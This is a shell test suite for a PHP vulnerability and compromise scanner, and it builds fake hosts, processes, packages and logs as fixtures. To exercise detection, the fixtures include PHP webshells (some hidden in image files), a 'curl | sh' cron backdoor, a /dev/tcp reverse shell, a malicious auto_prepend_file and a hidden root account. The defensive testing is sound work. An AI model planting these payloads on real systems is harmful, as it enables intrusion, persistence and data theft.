#!/bin/sh
# tests/run.sh: test suite for php2shell-check.sh (POSIX sh + jq).
#
# Every fixture (fake PHP builds, fake /proc, package databases, logs, web
# roots) is built at runtime in a temporary directory and removed on exit.
# Nothing binary is committed. The scanner is tested against the contract in
# docs/SPEC.md, not against its internals.
#
# Usage: sh tests/run.sh
#
# Environment:
#   TEST_SHELLS   comma-separated shells to run the scanner with
#                 (default: every available one of sh, dash, bash, "busybox sh")
#   TEST_SCANNER  scanner to test (default: ./php2shell-check.sh)
#   TEST_KEEP=1   keep the temporary directory (fixtures and JSON outputs)
#   TEST_VERBOSE=1  print scanner stderr for failed runs
#
# Exit status: 0 when every assertion passes, 1 otherwise, 2 on setup errors.
#
# SPDX-License-Identifier: Apache-2.0
#
# jq filters are single-quoted on purpose throughout this file.
# shellcheck disable=SC2016

set -u
LC_ALL=C
export LC_ALL
NO_COLOR=1
export NO_COLOR
unset PHP2SHELL_PROC PHP2SHELL_HOSTROOT PHP2SHELL_SOURCE_ONLY

TAB=$(printf '\t')
NL='
'

HERE=$(cd "$(dirname "$0")" && pwd -P)
REPO=$(cd "$HERE/.." && pwd -P)
SCANNER=${TEST_SCANNER:-$REPO/php2shell-check.sh}
DATA=$REPO/data/php2shell.json
PS1_FILE=$REPO/php2shell-check.ps1
PROBE_FILE=$REPO/probe/php2shell-probe.php

if ! command -v jq >/dev/null 2>&1; then
    printf 'tests/run.sh: jq is required\n' >&2
    exit 2
fi
for t_need in gzip cksum find sort awk sed; do
    command -v "$t_need" >/dev/null 2>&1 || { printf 'tests/run.sh: %s is required\n' "$t_need" >&2; exit 2; }
done
[ -f "$SCANNER" ] || { printf 'tests/run.sh: scanner not found: %s\n' "$SCANNER" >&2; exit 2; }
[ -f "$DATA" ] || { printf 'tests/run.sh: data file not found: %s\n' "$DATA" >&2; exit 2; }

T=$(mktemp -d 2>/dev/null || mktemp -d -t p2stest 2>/dev/null) || { printf 'tests/run.sh: mktemp failed\n' >&2; exit 2; }
T=$(cd "$T" && pwd -P)
# shellcheck disable=SC2329 # invoked by the EXIT trap
cleanup() {
    if [ "${TEST_KEEP:-0}" = 1 ]; then
        printf 'kept test directory: %s\n' "$T"
    else
        rm -rf "$T"
    fi
}
trap cleanup EXIT
trap 'exit 130' INT TERM HUP

FX=$T/fx            # every fixture lives here; the scanner must not write into it
OUT=$T/out          # scanner outputs
mkdir -p "$FX" "$OUT"

# ------------------------------------------------------------- assertions --

TOTAL_PASS=0
TOTAL_FAIL=0
SH_PASS=0
SH_FAIL=0
CUR=setup
FAILED_LIST=''

ok() {
    TOTAL_PASS=$((TOTAL_PASS + 1)); SH_PASS=$((SH_PASS + 1))
    printf 'PASS [%s] %s\n' "$CUR" "$1"
}
nok() {
    TOTAL_FAIL=$((TOTAL_FAIL + 1)); SH_FAIL=$((SH_FAIL + 1))
    if [ -n "${2:-}" ]; then
        printf 'FAIL [%s] %s -- %s\n' "$CUR" "$1" "$(printf '%s' "$2" | tr '\n' ' ' | cut -c1-400)"
    else
        printf 'FAIL [%s] %s\n' "$CUR" "$1"
    fi
    FAILED_LIST="${FAILED_LIST}[$CUR] $1$NL"
}
# eq LABEL ACTUAL EXPECTED
eq() { if [ "$2" = "$3" ]; then ok "$1"; else nok "$1" "got '$2', want '$3'"; fi; }
# has LABEL ACTUAL SUBSTRING
has() { case $2 in *"$3"*) ok "$1" ;; *) nok "$1" "got '$2', want it to contain '$3'" ;; esac; }
# lacks LABEL ACTUAL SUBSTRING
lacks() { case $2 in *"$3"*) nok "$1" "got '$2', must not contain '$3'" ;; *) ok "$1" ;; esac; }
# truth LABEL COMMAND...
truth() { t_label=$1; shift; if "$@"; then ok "$t_label"; else nok "$t_label"; fi; }

# ja LABEL FILTER [SHOW]: jq -e FILTER on the current report ($J). On failure,
# SHOW (a jq filter) is printed as the actual value.
ja() {
    if jq -e "$2" "$J" >/dev/null 2>&1; then ok "$1"
    else nok "$1" "$(jq -c "${3:-.summary}" "$J" 2>/dev/null | cut -c1-400)"; fi
}
# ia LABEL PATH CONDITION: some installation with this path satisfies CONDITION.
ia() {
    if jq -e --arg p "$2" "any(.installations[]; .path == \$p and ($3))" "$J" >/dev/null 2>&1; then ok "$1"
    else
        nok "$1" "$(jq -c --arg p "$2" '[.installations[] | select(.path == $p) | {scope, sapi, version, verdict, evidence, reason, exposure, branch_status, package, running}]' "$J" 2>/dev/null | cut -c1-400)"
    fi
}
# fa LABEL CONDITION: some finding satisfies CONDITION.
fa() {
    if jq -e "any(.findings[]; $2)" "$J" >/dev/null 2>&1; then ok "$1"
    else nok "$1" "$(jq -c '[.findings[] | "\(.severity)/\(.category)@\(.location)"]' "$J" 2>/dev/null | cut -c1-400)"; fi
}
# fn LABEL CONDITION: no finding satisfies CONDITION.
fn() {
    if jq -e "any(.findings[]; $2) | not" "$J" >/dev/null 2>&1; then ok "$1"
    else nok "$1" "$(jq -c "[.findings[] | select($2) | {severity, category, location, detail}]" "$J" 2>/dev/null | cut -c1-400)"; fi
}
# bit LABEL RC BIT WANT(1|0)
bit() {
    if [ $(( ($2 / $3) % 2 )) -eq "$4" ]; then ok "$1"; else nok "$1" "exit code $2"; fi
}

# Exit bit 2 is set by the scanner for non-root runs on Linux (limited coverage).
if [ "$(uname -s 2>/dev/null)" = Linux ] && [ "$(id -u 2>/dev/null)" != 0 ]; then
    INC=2
else
    INC=0
fi

# ---------------------------------------------------------------- fixtures --

OLD_STAMP=202601010000    # 2026-01-01, before the 2026-10-20 window
P_BTIME=1760000000        # fake boot time
P_START=2027200000        # starttime ticks: btime + 20272000 s = 2026-06-01 (CLK_TCK 100)
HOST_MNT=4026531840
CTR_MNT=4026532999
CTR_ID=c0ffee0123456789abcdef0123456789abcdef0123456789abcdef0123456789
CTR_SHORT=c0ffee012345

# mkbin PATH VERSION [fp|nofp] [elf|macho]: a fake PHP build. It carries the
# SAPI_PHP_VERSION_HEADER string and, with fp, the patch fingerprint.
mkbin() {
    mkdir -p "${1%/*}"
    {
        if [ "${4:-elf}" = macho ]; then printf '\317\372\355\376\014\000\000\001'; else printf '\177ELF\002\001\001\000'; fi
        printf '\000\000\000\000\000\000\000\000\003\000>\000\001\000\000\000'
        printf 'GCC: (fixture) 12.2.0\000zend_extension\000'
        printf 'X-Powered-By: PHP/%s\000' "$2"
        printf 'Allowed memory size of %%zu bytes exhausted (tried to allocate %%zu bytes)\000'
        if [ "${3:-nofp}" = fp ]; then
            printf 'Hard memory limit of %%zu bytes exhausted\000memory_hard_limit_percent\000'
        fi
        printf 'trailer\000'
    } > "$1"
    chmod 755 "$1"
}
# mkelf PATH: a native binary that is not PHP.
mkelf() {
    mkdir -p "${1%/*}"
    printf '\177ELF\002\001\001\000\000\000\000\000Apache/2.4.62 (fixture)\000' > "$1"
    chmod 755 "$1"
}
# mkfile PATH LINE...: a text file with one argument per line.
mkfile() {
    mk_p=$1; shift
    mkdir -p "${mk_p%/*}"
    printf '%s\n' "$@" > "$mk_p"
}
# mkgz PATH LINE...: a gzip-compressed text file.
mkgz() {
    mk_p=$1; shift
    mkdir -p "${mk_p%/*}"
    printf '%s\n' "$@" | gzip -c > "$mk_p"
}
old() { for o_f in "$@"; do touch -t "$OLD_STAMP" "$o_f"; done; }

# proc_init DIR: the parts of a fake /proc that are not per process.
proc_init() {
    mkdir -p "$1/self/ns"
    printf '4242 (sh) S 1 4242 4242 0 -1 4194560 0 0 0 0 0 0 0 0 20 0 1 0 %s 1 1 1\n' "$P_START" > "$1/self/stat"
    ln -s "mnt:[$HOST_MNT]" "$1/self/ns/mnt"
    printf 'cpu  100 0 100 1000 0 0 0 0 0 0\nbtime %s\nprocesses 5000\n' "$P_BTIME" > "$1/stat"
}
# proc_add DIR PID PPID COMM UID EXE ROOTDIR MNT CGROUP CMDLINE [MAPLINE...]
# P_EXE_INO: inode written for the exe in maps (default 0: unknown, as for
# anonymous mappings).
proc_add() {
    pa_d=$1/$2
    mkdir -p "$pa_d/ns"
    printf '%s (%s) S %s %s %s 0 -1 4194560 0 0 0 0 0 0 0 0 20 0 1 0 %s 104857600 2560 18446744073709551615\n' \
        "$2" "$4" "$3" "$2" "$2" "$P_START" > "$pa_d/stat"
    printf 'Name:\t%s\nUmask:\t0022\nState:\tS (sleeping)\nTgid:\t%s\nPid:\t%s\nPPid:\t%s\nUid:\t%s\t%s\t%s\t%s\nGid:\t%s\t%s\t%s\t%s\n' \
        "$4" "$2" "$2" "$3" "$5" "$5" "$5" "$5" "$5" "$5" "$5" "$5" > "$pa_d/status"
    printf '%s\n' "$4" > "$pa_d/comm"
    { printf '%s' "${10}" | tr ' ' '\000'; printf '\000'; } > "$pa_d/cmdline"
    ln -s "$6" "$pa_d/exe"
    ln -s "$7" "$pa_d/root"
    ln -s "mnt:[$8]" "$pa_d/ns/mnt"
    printf '%s\n' "$9" > "$pa_d/cgroup"
    printf '55d5c0000000-55d5c0100000 r-xp 00000000 08:01 %s %s\n' "${P_EXE_INO:-0}" "$6" > "$pa_d/maps"
    shift 10
    for pa_m in "$@"; do printf '%s\n' "$pa_m" >> "$pa_d/maps"; done
}
HOST_CG='0::/system.slice/fixture.service'

dpkg_status_stanza() {  # PACKAGE SOURCE VERSION
    printf 'Package: %s\nStatus: install ok installed\nPriority: optional\nSection: php\nInstalled-Size: 4000\nMaintainer: Fixture <fixture@example.invalid>\nArchitecture: amd64\nSource: %s\nVersion: %s\nDescription: fixture package\n\n' "$1" "$2" "$3"
}

NOPROC=$FX/noproc    # an empty directory: "no /proc on this system"
mkdir -p "$NOPROC"
# Without /proc running processes cannot be checked, so the scanner always
# sets exit bit 2 (INCOMPLETE) on such runs (SPEC sections 1 and 6).
NPI=2
EMPTY_PS=$FX/ps-empty.txt   # ps fallback output: no processes
: > "$EMPTY_PS"

# A: Debian host, full scan. dpkg FPM below the fixed version (running, 3
# processes), mod_php mapped into apache2, a CLI under a path with spaces,
# configuration context and every compromise indicator.
build_A() {
    R=$FX/A/root; P=$FX/A/proc
    mkfile "$R/etc/os-release" 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"' 'NAME="Debian GNU/Linux"' 'VERSION_ID="12"' 'ID=debian'
    mkbin "$R/usr/sbin/php-fpm8.2" 8.2.20
    mkbin "$R/usr/lib/apache2/modules/libphp8.2.so" 8.2.20
    mkelf "$R/usr/sbin/apache2"
    mkbin "$R/opt/my php/bin/php" 8.5.11
    mkfile "$R/usr/local/bin/php" '#!/bin/sh' '# X-Powered-By: PHP/7.0.0 (a wrapper script, not a PHP build)' 'exec /usr/bin/php8.2 "$@"'
    chmod 755 "$R/usr/local/bin/php"
    old "$R/usr/sbin/php-fpm8.2" "$R/usr/lib/apache2/modules/libphp8.2.so" "$R/usr/sbin/apache2" "$R/opt/my php/bin/php" "$R/usr/local/bin/php"

    mkdir -p "$R/var/lib/dpkg/info"
    mkfile "$R/var/lib/dpkg/info/php8.2-fpm.list" '/.' '/usr' '/usr/sbin' '/usr/sbin/php-fpm8.2' '/usr/share/doc/php8.2-fpm' '/usr/share/doc/php8.2-fpm/changelog.Debian.gz'
    mkfile "$R/var/lib/dpkg/info/php8.2-common.list" '/.' '/usr/share/doc/php8.2-common'
    {
        dpkg_status_stanza libphp-embed-decoy libphp-embed-decoy 9.9.9-1
        dpkg_status_stanza php8.2-common php8.2 8.2.20-1~deb12u1
        dpkg_status_stanza php8.2-fpm php8.2 8.2.20-1~deb12u1
    } > "$R/var/lib/dpkg/status"
    mkgz "$R/usr/share/doc/php8.2-fpm/changelog.Debian.gz" \
        'php8.2 (8.2.20-1~deb12u1) bookworm-security; urgency=medium' '' \
        '  * New upstream version 8.2.20 (fixes CVE-2024-8925, CVE-2024-8926)' '' \
        ' -- Fixture Maintainer <fixture@example.invalid>  Fri, 07 Jun 2024 12:00:00 +0000'

    # Configuration context.
    mkfile "$R/etc/php/8.2/fpm/pool.d/www.conf" '[www]' 'user = www-data' 'group = www-data' \
        'listen = /run/php/php8.2-fpm.sock' 'pm = dynamic' \
        'php_admin_value[session.upload_progress.enabled] = 0' \
        'php_admin_value[error_log] = /var/log/php_errors.log'
    mkfile "$R/etc/nginx/sites-enabled/default" 'server {' '    listen 80;' '    root /srv/app/public;' \
        '    index index.php;' '    location ~ \.php$ {' '        include snippets/fastcgi-php.conf;' \
        '        fastcgi_pass unix:/run/php/php8.2-fpm.sock;' \
        '        fastcgi_param PHP_VALUE "auto_detect_line_endings=1";' '    }' '}'
    mkfile "$R/etc/apache2/sites-enabled/000-default.conf" '<VirtualHost *:80>' \
        '    DocumentRoot "/srv/site two/htdocs"' '    ErrorLog ${APACHE_LOG_DIR}/error.log' '</VirtualHost>'

    # Logs changed in the window.
    mkfile "$R/var/log/php8.2-fpm.log" \
        '[15-Oct-2026 08:00:00] NOTICE: fpm is running, pid 190' \
        '[21-Oct-2026 09:59:00] NOTICE: fpm is running, pid 200' \
        '[21-Oct-2026 10:00:00] WARNING: [pool www] child 123 exited on signal 11 (SIGSEGV - core dumped) after 0.5 seconds from start' \
        '[21-Oct-2026 10:00:01] WARNING: [pool www] child 125 exited on signal 11 (SIGSEGV - core dumped) after 0.7 seconds from start' \
        '[21-Oct-2026 10:00:02] WARNING: [pool www] child 124 exited with code 255 after 0.010000 seconds from start'
    mkfile "$R/var/log/php_errors.log" \
        '[21-Oct-2026 10:00:01 UTC] PHP Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in Unknown on line 0'
    mkfile "$R/var/log/apache2/site a-error.log" \
        '[Thu Oct 01 08:00:00.000001 2026] [mpm_prefork:notice] [pid 300] AH00052: child pid 99 exit signal Segmentation fault (11)' \
        '[Wed Oct 21 10:00:00.123456 2026] [mpm_prefork:notice] [pid 300] AH00052: child pid 123 exit signal Segmentation fault (11)'
    mkfile "$R/var/log/kern.log" \
        'Oct 21 10:00:00 web1 kernel: [12345.678901] php-fpm8.3[123]: segfault at 0 ip 000055d5c0001234 sp 00007ffc00001234 error 4 in php-fpm8.3[55d5c0000000+100000]'
    mkfile "$R/var/log/nginx/error.log.1" \
        '2026/10/21 10:00:00 [error] 77#77: php-fpm8.2[77]: segfault at 0 ip 0 sp 0 error 4' \
        '[21-Oct-2026 10:00:00] WARNING: [pool www] child 77 exited on signal 11 (SIGSEGV - core dumped) after 0.1 seconds from start'
    old "$R/var/log/nginx/error.log.1"

    # Web roots: /var/www, the nginx root and the Apache DocumentRoot.
    W=$R/var/www/html
    mkfile "$W/index.php" '<?php echo "hello";'
    mkfile "$W/cmd.php" '<?php system($_GET["c"]); ?>'
    mkfile "$W/wp-content/uploads/2026/10/evil shell.php" '<?php eval(base64_decode($_POST["x"])); // DB_PASSWORD=hunter2-fixture ?>'
    mkfile "$W/wp-content/uploads/old/legacy.php" '<?php echo 1;'
    mkfile "$W/old/about-old.php" '<?php echo "about";'
    mkfile "$W/old/.htaccess" 'php_value auto_prepend_file /var/www/html/old/pre.php'
    mkfile "$W/.user.ini" 'auto_prepend_file=/tmp/.cache.php'
    mkfile "$W/wf/.user.ini" "auto_prepend_file = '/var/www/html/wordfence-waf.php'"
    mkfile "$W/wordfence-waf.php" '<?php // Wordfence WAF loader fixture'
    printf '\000\000\001\000\001\000\020\020<?php @eval($_POST[1]); ?>\000' > "$W/favicon.ico"
    mkdir -p "$W/images"
    printf '\211PNG\r\n\032\n\000\000\000\015IHDR<?php system($_GET["i"]); ?>\000' > "$W/images/logo.png"
    old "$W/wp-content/uploads/old/legacy.php" "$W/old/about-old.php" "$W/old/.htaccess"
    mkfile "$R/srv/app/public/new.php" '<?php echo "new";'
    mkfile "$R/srv/site two/htdocs/new page.php" '<?php echo "page";'

    # Persistence.
    mkfile "$R/etc/cron.d/backdoor" '* * * * * root curl http://x/a | sh'
    mkfile "$R/etc/cron.d/php" '09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && /usr/lib/php/sessionclean'
    old "$R/etc/cron.d/php"
    mkfile "$R/etc/passwd" 'root:x:0:0:root:/root:/bin/bash' 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin' \
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin' 'sysbak:x:0:0::/root:/bin/sh'

    # Processes: an FPM group (master + 2 workers), apache2 with libphp mapped,
    # and a reverse shell under an FPM worker.
    proc_init "$P"
    proc_add "$P" 1 0 systemd 0 /usr/lib/systemd/systemd "$R" "$HOST_MNT" '0::/init.scope' '/sbin/init'
    proc_add "$P" 200 1 php-fpm8.2 0 /usr/sbin/php-fpm8.2 "$R" "$HOST_MNT" "$HOST_CG" 'php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)'
    proc_add "$P" 201 200 php-fpm8.2 33 /usr/sbin/php-fpm8.2 "$R" "$HOST_MNT" "$HOST_CG" 'php-fpm: pool www'
    proc_add "$P" 202 200 php-fpm8.2 33 /usr/sbin/php-fpm8.2 "$R" "$HOST_MNT" "$HOST_CG" 'php-fpm: pool www'
    proc_add "$P" 210 201 bash 33 /usr/bin/bash "$R" "$HOST_MNT" "$HOST_CG" 'bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
    proc_add "$P" 300 1 apache2 0 /usr/sbin/apache2 "$R" "$HOST_MNT" "$HOST_CG" '/usr/sbin/apache2 -k start' \
        '7f0000000000-7f0000100000 r-xp 00000000 08:01 0 /usr/lib/apache2/modules/libphp8.2.so'
    proc_add "$P" 301 300 apache2 33 /usr/sbin/apache2 "$R" "$HOST_MNT" "$HOST_CG" '/usr/sbin/apache2 -k start' \
        '7f0000000000-7f0000100000 r-xp 00000000 08:01 0 /usr/lib/apache2/modules/libphp8.2.so'
}

# B: restart required. Fixed builds on disk, but the running code is stale:
# a deleted FPM exe, an exe newer than its process, and a deleted libphp map.
build_B() {
    R=$FX/B/root; P=$FX/B/proc
    mkfile "$R/etc/os-release" 'ID=debian' 'VERSION_ID="12"'
    mkbin "$R/usr/sbin/php-fpm8.3" 8.3.36
    mkbin "$R/usr/local/sbin/php-fpm" 8.4.27 fp
    mkbin "$R/usr/lib/apache2/modules/libphp8.5.so" 8.5.12 fp
    mkelf "$R/usr/sbin/apache2"
    mkbin "$R/usr/bin/php8.2" 8.2.35 fp
    old "$R/usr/sbin/php-fpm8.3" "$R/usr/lib/apache2/modules/libphp8.5.so" "$R/usr/sbin/apache2" "$R/usr/bin/php8.2"
    # /usr/local/sbin/php-fpm keeps mtime "now": newer than its process start.
    proc_init "$P"
    proc_add "$P" 600 1 php-fpm8.3 0 '/usr/sbin/php-fpm8.3 (deleted)' "$R" "$HOST_MNT" "$HOST_CG" 'php-fpm: master process (/etc/php/8.3/fpm/php-fpm.conf)'
    proc_add "$P" 601 600 php-fpm8.3 33 '/usr/sbin/php-fpm8.3 (deleted)' "$R" "$HOST_MNT" "$HOST_CG" 'php-fpm: pool www'
    proc_add "$P" 610 1 php-fpm 0 /usr/local/sbin/php-fpm "$R" "$HOST_MNT" "$HOST_CG" 'php-fpm: master process (/usr/local/etc/php-fpm.conf)'
    proc_add "$P" 611 610 php-fpm 33 /usr/local/sbin/php-fpm "$R" "$HOST_MNT" "$HOST_CG" 'php-fpm: pool www'
    proc_add "$P" 620 1 apache2 0 /usr/sbin/apache2 "$R" "$HOST_MNT" "$HOST_CG" '/usr/sbin/apache2 -k start' \
        '7f0000000000-7f0000100000 r-xp 00000000 08:01 0 /usr/lib/apache2/modules/libphp8.5.so (deleted)'
}

# C: Ubuntu EOL 8.1 packages, with and without the CVE in the changelog, plus
# a fingerprinted source build of 8.1.34.
build_C() {
    R=$FX/C/root
    mkfile "$R/etc/os-release" 'PRETTY_NAME="Ubuntu 22.04.5 LTS"' 'NAME="Ubuntu"' 'VERSION_ID="22.04"' 'ID=ubuntu' 'ID_LIKE=debian'
    mkbin "$R/usr/bin/php8.1" 8.1.2-1ubuntu2.20
    mkbin "$R/usr/sbin/php-fpm8.1" 8.1.2-1ubuntu2.20
    mkbin "$R/usr/bin/php-cgi8.1" 8.1.2-1ubuntu2.20
    mkbin "$R/usr/local/bin/php" 8.1.34 fp
    old "$R/usr/bin/php8.1" "$R/usr/sbin/php-fpm8.1" "$R/usr/bin/php-cgi8.1" "$R/usr/local/bin/php"
    mkdir -p "$R/var/lib/dpkg/info"
    mkfile "$R/var/lib/dpkg/info/php8.1-cli.list" '/.' '/usr/bin' '/usr/bin/php8.1' '/usr/share/doc/php8.1-cli'
    mkfile "$R/var/lib/dpkg/info/php8.1-fpm.list" '/.' '/usr/sbin' '/usr/sbin/php-fpm8.1' '/usr/share/doc/php8.1-fpm'
    mkfile "$R/var/lib/dpkg/info/php8.1-cgi.list" '/.' '/usr/bin' '/usr/bin/php-cgi8.1' '/usr/share/doc/php8.1-cgi'
    {
        dpkg_status_stanza php8.1-cgi php8.1 8.1.2-1ubuntu2.20
        dpkg_status_stanza php8.1-cli php8.1 8.1.2-1ubuntu2.20
        dpkg_status_stanza php8.1-fpm php8.1 8.1.2-1ubuntu2.20
    } > "$R/var/lib/dpkg/status"
    mkgz "$R/usr/share/doc/php8.1-cli/changelog.Debian.gz" \
        'php8.1 (8.1.2-1ubuntu2.20) jammy-security; urgency=medium' '' \
        '  * SECURITY UPDATE: RCE via OOM corruption' '    - CVE-2026-109618' \
        '  * SECURITY UPDATE: RCE via stale global state' '    - CVE-2026-109619' '' \
        ' -- Fixture Security <security@example.invalid>  Wed, 21 Oct 2026 12:00:00 +0000'
    mkgz "$R/usr/share/doc/php8.1-fpm/changelog.Debian.gz" \
        'php8.1 (8.1.2-1ubuntu2.19) jammy-security; urgency=medium' '' \
        '  * SECURITY UPDATE: older issue' '    - CVE-2025-1861' '' \
        ' -- Fixture Security <security@example.invalid>  Mon, 01 Sep 2025 12:00:00 +0000'
}

# D: Alpine apk packages, a pre-release and a fingerprinted pre-release.
build_D() {
    R=$FX/D/root
    mkfile "$R/etc/os-release" 'NAME="Alpine Linux"' 'ID=alpine' 'VERSION_ID=3.20.3' 'PRETTY_NAME="Alpine Linux v3.20"'
    mkbin "$R/usr/sbin/php-fpm83" 8.3.12
    mkbin "$R/usr/bin/php83" 8.3.12
    mkbin "$R/usr/local/bin/php" 8.6.0RC3
    mkbin "$R/usr/local/bin/php-cgi" 8.6.0RC3 fp
    old "$R/usr/sbin/php-fpm83" "$R/usr/bin/php83" "$R/usr/local/bin/php" "$R/usr/local/bin/php-cgi"
    mkfile "$R/lib/apk/db/installed" \
        'C:Q1fixtureAAAAAAAAAAAAAAAAAAAAAAAAA=' 'P:musl' 'V:1.2.5-r0' 'A:x86_64' 'F:lib' 'R:ld-musl-x86_64.so.1' 'a:0:0:755' '' \
        'C:Q1fixtureBBBBBBBBBBBBBBBBBBBBBBBBB=' 'P:php83' 'V:8.3.12-r0' 'A:x86_64' 'o:php83' 'F:usr/bin' 'R:php83' 'a:0:0:755' 'Z:Q1zzz=' '' \
        'C:Q1fixtureCCCCCCCCCCCCCCCCCCCCCCCCC=' 'P:php83-fpm' 'V:8.3.12-r0' 'A:x86_64' 'o:php83' \
        'F:etc/php83/php-fpm.d' 'R:www.conf' 'F:usr/sbin' 'R:php-fpm83' 'a:0:0:755' 'Z:Q1yyy=' ''
}

# E: a running container. The host has no PHP; the container's FPM is found
# through /proc/<pid>/root and labelled with its container id.
build_E() {
    R=$FX/E/root; P=$FX/E/proc; C=$FX/E/ctr-rootfs
    mkfile "$R/etc/os-release" 'ID=ubuntu' 'VERSION_ID="24.04"'
    mkfile "$C/etc/os-release" 'ID=debian' 'VERSION_ID="12"' 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"'
    mkbin "$C/usr/local/sbin/php-fpm" 8.4.26
    mkbin "$C/usr/local/bin/php" 8.4.26
    old "$C/usr/local/sbin/php-fpm" "$C/usr/local/bin/php"
    proc_init "$P"
    proc_add "$P" 1 0 systemd 0 /usr/lib/systemd/systemd "$R" "$HOST_MNT" '0::/init.scope' '/sbin/init'
    proc_add "$P" 700 1 containerd-shim 0 /usr/bin/containerd-shim-runc-v2 "$R" "$HOST_MNT" "$HOST_CG" "/usr/bin/containerd-shim-runc-v2 -id $CTR_ID"
    proc_add "$P" 701 700 php-fpm 0 /usr/local/sbin/php-fpm "$C" "$CTR_MNT" "0::/system.slice/docker-$CTR_ID.scope" 'php-fpm: master process (/usr/local/etc/php-fpm.conf)'
    proc_add "$P" 702 701 php-fpm 33 /usr/local/sbin/php-fpm "$C" "$CTR_MNT" "0::/system.slice/docker-$CTR_ID.scope" 'php-fpm: pool www'
}

# F: only fixed builds, one per SAPI, including a Mach-O build and a
# non-native wrapper that must be ignored. Clean web root and log.
build_F() {
    R=$FX/F/root
    mkfile "$R/etc/os-release" 'ID=debian' 'VERSION_ID="13"'
    mkbin "$R/usr/bin/php8.3" 8.3.36
    mkbin "$R/usr/sbin/php-fpm8.5" 8.5.12 fp
    mkbin "$R/usr/bin/php-cgi8.4" 8.4.27 fp
    mkbin "$R/usr/bin/phpdbg8.2" 8.2.35 fp
    mkbin "$R/usr/local/bin/lsphp" 8.3.36 fp
    mkbin "$R/usr/local/bin/frankenphp" 8.4.27 fp
    mkbin "$R/usr/lib/apache2/modules/libphp8.4.so" 8.4.26 fp
    mkbin "$R/opt/homebrew/opt/php/sbin/php-fpm" 8.5.12 fp macho
    mkfile "$R/usr/local/bin/php" '#!/bin/sh' '# X-Powered-By: PHP/5.6.40' 'exec /usr/bin/php8.3 "$@"'
    chmod 755 "$R/usr/local/bin/php"
    mkfile "$R/usr/sbin/php-fpm7.4" 'not a binary: X-Powered-By: PHP/7.4.33'
    for f_f in usr/bin/php8.3 usr/sbin/php-fpm8.5 usr/bin/php-cgi8.4 usr/bin/phpdbg8.2 usr/local/bin/lsphp \
        usr/local/bin/frankenphp usr/lib/apache2/modules/libphp8.4.so opt/homebrew/opt/php/sbin/php-fpm \
        usr/local/bin/php usr/sbin/php-fpm7.4; do
        old "$R/$f_f"
    done
    mkfile "$R/var/www/html/index.php" '<?php echo "ok";'
    old "$R/var/www/html/index.php"
    mkfile "$R/var/log/php8.5-fpm.log" '[21-Oct-2026 09:59:00] NOTICE: fpm is running, pid 100' '[21-Oct-2026 09:59:00] NOTICE: ready to handle connections'
    mkfile "$R/etc/passwd" 'root:x:0:0:root:/root:/bin/bash' 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin'
    old "$R/etc/passwd"
}

# G: a branch newer than the data (master).
build_G() {
    R=$FX/G/root
    mkfile "$R/etc/os-release" 'ID=debian'
    mkbin "$R/usr/local/bin/php" 8.7.0-dev
    old "$R/usr/local/bin/php"
}

# H: no PHP at all.
build_H() {
    R=$FX/H/root
    mkfile "$R/etc/os-release" 'ID=debian'
    mkdir -p "$R/usr/bin" "$R/usr/sbin" "$R/opt"
    mkelf "$R/usr/bin/phpize-not-php"
}

# S: a root directory whose own path contains spaces.
S_ROOT="$FX/S dir/root fs"
build_S() {
    R=$S_ROOT
    mkfile "$R/etc/os-release" 'ID=debian'
    mkbin "$R/opt/my php/bin/php-fpm" 8.3.12
    old "$R/opt/my php/bin/php-fpm"
    mkfile "$R/var/www/html/up loads/evil one.php" '<?php system($_GET["x"]); ?>'
}

# mkraw PATH BYTES...: a native binary from printf format strings (no PHP
# version string unless one is passed).
mkraw() {
    mk_p=$1; shift
    mkdir -p "${mk_p%/*}"
    { printf '\177ELF\002\001\001\000\000\000\000\000'; for mk_s in "$@"; do printf "$mk_s"; done; } > "$mk_p"
    chmod 755 "$mk_p"
}
ino_of() { ls -di "$1" | awk '{ print $1 }'; }
ESC=$(printf '\033')
PRIV_MNT=4026532555

# U: unit-test web roots (a configured root nested in a default one).
build_U() {
    R=$FX/U/root
    mkdir -p "$R/var/www/html"
    mkfile "$R/etc/nginx/sites-enabled/default" 'server {' '    root /var/www/html;' '}'
}

# G2: a release of a branch newer than the data.
build_G2() {
    R=$FX/G2/root
    mkfile "$R/etc/os-release" 'ID=debian'
    mkbin "$R/usr/local/bin/php" 9.0.0
    old "$R/usr/local/bin/php"
}

# J: PHP-named native binaries without a readable version string.
build_J() {
    R=$FX/J/root
    mkfile "$R/etc/os-release" 'ID=debian'
    mkraw "$R/usr/local/sbin/php-fpm" 'UPX!\000\001\002packed\000'
    mkraw "$R/usr/bin/php" 'Hard memory limit of %%zu bytes exhausted\000'
    mkraw "$R/usr/local/bin/php-fpm_exporter" 'prometheus exporter\000'
    old "$R/usr/local/sbin/php-fpm" "$R/usr/bin/php" "$R/usr/local/bin/php-fpm_exporter"
}

# J2: a PHP build that cannot be read (non-root runs only).
build_J2() {
    R=$FX/J2/root
    mkfile "$R/etc/os-release" 'ID=debian'
    mkbin "$R/usr/bin/php8.3" 8.3.36 fp
    mkbin "$R/usr/local/bin/php8.4" 8.4.27 fp
    old "$R/usr/bin/php8.3" "$R/usr/local/bin/php8.4"
    chmod 000 "$R/usr/local/bin/php8.4"
}

# K: dpkg EOL package whose changelog names the CVEs (FIXED on disk), but the
# FPM processes started before the file was replaced and still run the old,
# identical-looking 7.4.33.
build_K() {
    R=$FX/K/root; P=$FX/K/proc
    mkfile "$R/etc/os-release" 'ID=debian' 'VERSION_ID="11"'
    mkbin "$R/usr/sbin/php-fpm7.4" 7.4.33
    mkfile "$R/var/lib/dpkg/info/php7.4-fpm.list" '/.' '/usr/sbin' '/usr/sbin/php-fpm7.4' '/usr/share/doc/php7.4-fpm'
    dpkg_status_stanza php7.4-fpm php7.4 7.4.33-1+deb11u9 > "$R/var/lib/dpkg/status"
    mkgz "$R/usr/share/doc/php7.4-fpm/changelog.Debian.gz" \
        'php7.4 (7.4.33-1+deb11u9) bullseye-security; urgency=high' '' '  * Fix CVE-2026-109618 and CVE-2026-109619' '' \
        ' -- Fixture Security <security@example.invalid>  Wed, 21 Oct 2026 12:00:00 +0000'
